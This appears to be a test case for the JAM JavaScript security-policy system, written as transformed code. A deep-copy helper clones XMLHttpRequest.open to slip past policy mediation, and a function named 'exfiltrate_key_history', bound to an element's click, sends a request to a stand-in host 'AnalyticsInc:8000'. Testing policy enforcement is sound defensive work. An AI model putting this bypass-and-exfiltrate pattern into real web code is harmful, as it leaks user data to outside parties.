
JAM.startProfile('load');
function copy(obj$$16) {
  var v12 = typeof obj$$16;
  var v9 = v12 !== "object";
  if (v9) {
    return obj$$16;
  } else {
    var value$$27 = obj$$16.valueOf();
    var v8 = obj$$16 != value$$27;
    if (v8) {
      var v0 = obj$$16.constructor;
      return new v0(value$$27);
    } else {
      var v18 = obj$$16.constructor;
      var v13 = obj$$16 instanceof v18;
      if (v13) {
        var v19 = obj$$16.constructor;
        v13 = v19 !== Object;
      }
      var v7 = v13;
      if (v7) {
        var v14 = obj$$16.constructor;
        var v1 = v14.prototype;
        var c = clone(v1);
        var property;
        for (property in obj$$16) {
          var v4 = obj$$16.hasOwnProperty(property);
          if (v4) {
            var v2 = c;
            var v3 = property;
            introspect(JAM.policy.p1) {
              var v15 = obj$$16[property]
            }
            var v20 = copy(v15);
            v2[v3] = v20;
          }
        }
      } else {
        c = {};
        for (property in obj$$16) {
          var v5 = c;
          var v6 = property;
          introspect(JAM.policy.p1) {
            var v16 = obj$$16[property]
          }
          var v21 = copy(v16);
          v5[v6] = v21;
        }
      }
      return c;
    }
  }
  return;
}
function Clone() {
  return;
}
function clone(obj$$17) {
  Clone.prototype = obj$$17;
  return new Clone;
}
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v10 = xmlhttp;
  introspect(JAM.policy.p1) {
    var v17 = xmlhttp.open
  }
  var v22 = copy(v17);
  v10.opennew = v22;
  xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true);
  xmlhttp.send(null);
  return;
}
var v11 = document.getElementById("test");
v11.onclick = exfiltrate_key_history

JAM.stopProfile('load');
